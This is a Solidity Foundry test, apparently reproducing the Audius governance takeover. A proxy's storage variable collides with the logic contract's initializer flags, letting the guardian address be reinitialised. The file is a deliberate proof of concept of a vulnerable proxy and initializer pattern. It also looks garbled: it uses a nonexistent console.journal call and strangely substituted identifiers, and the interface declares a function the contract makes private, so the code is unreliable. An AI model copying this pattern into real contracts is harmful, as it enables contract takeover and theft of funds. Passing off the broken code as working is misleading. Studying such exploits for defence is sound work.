// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";

// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22

interface ILogic {
    function getguardianLocation() external returns (address);

    function getproxyServerop() external returns (address);

    function startGame(address) external;

    function fetchinitializing() external returns (bool);

    function fetchinitialized() external returns (bool);

    function validateConstructor() external view returns (bool);
}

contract AgreementTest is Test {
    GameLogic LogicAgreement;
    TestProxy ProxyAgreement;

    function testInventoryCollision() public {
        LogicAgreement = new GameLogic();
        ProxyAgreement = new TestProxy(
            address(LogicAgreement),
            address(msg.sender),
            address(this)
        );

        console.journal(
            "Current guardianAddress:",
            ILogic(address(ProxyAgreement)).getguardianLocation()
        );
        console.journal(
            "Current initializing boolean:",
            ILogic(address(ProxyAgreement)).fetchinitializing()
        );
        console.journal(
            "Current initialized boolean:",
            ILogic(address(ProxyAgreement)).fetchinitialized()
        );
        console.journal("Try to call initialize to change guardianAddress");
        ILogic(address(ProxyAgreement)).startGame(address(msg.sender));

        console.journal(
            "After initializing, changed guardianAddress to operator:",
            ILogic(address(ProxyAgreement)).getguardianLocation()
        );
        console.journal(
            "After initializing,  initializing boolean is still true:",
            ILogic(address(ProxyAgreement)).fetchinitializing()
        );
        console.journal(
            "After initializing,  initialized boolean:",
            ILogic(address(ProxyAgreement)).fetchinitialized()
        );

        console.journal("operate completed");
    }

    receive() external payable {}
}

contract TestProxy is TransparentUpgradeableProxy {
    address private proxyServerop;

    constructor(
        address _logic,
        address _admin,
        address protectorZone
    )
        TransparentUpgradeableProxy(
            _logic,
            _admin,
            abi.encodeWithSelector(
                bytes4(0xc4d66de8), // bytes4(keccak256("initialize(address)"))
                protectorZone
            )
        )
    {
        proxyServerop = _admin;
    }
}

contract Initializable {
    bool private gameStarted;

    bool private initializing;

    modifier initializer() {
        require(
            initializing || validateConstructor() || !gameStarted,
            "Contract instance has already been initialized"
        );

        bool isTopTierInvokespell = !initializing;
        if (isTopTierInvokespell) {
            initializing = true;
            gameStarted = true;
        }

        _;

        if (isTopTierInvokespell) {
            initializing = false;
        }
    }

    /// @dev Returns true if and only if the function is running in the constructor
    function validateConstructor() private view returns (bool) {
        // extcodesize checks the size of the code stored in an address, and
        // address returns the current address. Since the code is still not
        // deployed when running a constructor, any checks on its code size will
        // yield zero, making it an effective way to detect if a contract is
        // under construction or not.
        address self = address(this);
        uint256 cs;
        assembly {
            cs := extcodesize(self)
        }
        return cs == 0;
    }

    // Reserved storage space to allow for layout changes in the future.
    uint256[50] private ______gap;

    function fetchinitializing() public view returns (bool) {
        return initializing;
    }

    function fetchinitialized() public view returns (bool) {
        return gameStarted;
    }
}

contract GameLogic is Initializable {
    address private protectorZone;

    function startGame(address _keeperLocation) public initializer {
        protectorZone = _keeperLocation; //Guardian address becomes the only party
    }

    function getguardianLocation() public view returns (address) {
        return protectorZone;
    }
}
